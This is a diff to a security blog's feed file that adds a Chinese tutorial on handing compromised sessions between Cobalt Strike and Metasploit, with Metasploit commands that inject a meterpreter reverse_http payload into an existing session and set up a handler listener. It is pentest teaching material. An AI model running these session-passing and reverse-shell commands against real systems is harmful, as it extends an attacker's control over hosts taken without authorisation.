@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>CS与MSF联动</title>
+    <link href="/2024/12/04/CS%E4%B8%8EMSF%E8%81%94%E5%8A%A8/"/>
+    <url>/2024/12/04/CS%E4%B8%8EMSF%E8%81%94%E5%8A%A8/</url>
+    
+    <content type="html"><![CDATA[<h1 id="MSF-传递会话到-CS"><a href="#MSF-传递会话到-CS" class="headerlink" title="MSF 传递会话到 CS"></a>MSF 传递会话到 CS</h1><p> 首先正常 CS 连接到服务器上</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256015.png"></p><p>在 CS 上新建一个监听器 Beacon HTTP，具体 ip 配置和监听端口自行修正；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256245.png"></p><p>来到获取到会话的 MSF 中，将指定会话传递到 CS 中；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256590.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.48.128   <span class="hljs-comment"># CS服务端IP</span><br><span class="hljs-built_in">set</span> lport 4444       <span class="hljs-comment"># CS服务端监听的端口号</span><br><span class="hljs-built_in">set</span> DisablePayloadHandler True<br><span class="hljs-built_in">set</span> PrependMigrate True<br><span class="hljs-built_in">set</span> session 2  <span class="hljs-comment"># 会话id</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256130.png"></p><h1 id="CS-传递会话到-MSF"><a href="#CS-传递会话到-MSF" class="headerlink" title="CS 传递会话到 MSF"></a>CS 传递会话到 MSF</h1><p>先在 msf 上启动监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.48.128<br><span class="hljs-built_in">set</span> lport 4445<br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256859.png"></p><p>在 CS 上船舰一个 Foreign HTTP 监听，IP 和端口设置为 MSF 上监听的 IP 和端口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256305.png"></p><p>在 CS 上右键待传递的会话，选择新建会话， 选择刚才创建的 Foreign HTTP 监听器</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256446.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256208.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>内网渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>工具教程</tag>
+      
+      <tag>内网渗透</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>基于PUF的物联网设备安全认证</title>
     <link href="/2024/12/02/%E5%9F%BA%E4%BA%8EPUF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/"/>
     <url>/2024/12/02/%E5%9F%BA%E4%BA%8EPUF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/</url>
